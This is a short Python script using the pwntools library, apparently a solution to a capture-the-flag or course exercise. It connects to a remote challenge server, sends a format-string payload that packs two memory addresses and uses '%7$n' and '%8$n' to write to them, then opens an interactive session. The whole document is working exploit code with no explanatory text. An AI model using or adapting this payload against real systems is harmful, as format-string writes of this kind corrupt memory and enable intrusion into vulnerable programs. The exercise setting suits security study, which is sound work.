from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22196)

payload = p32(0x804a078) + p32(0x804a070) + b'%7$n' + b'%8$n'

s.sendline(payload)
print(s.recvline())

s.interactive()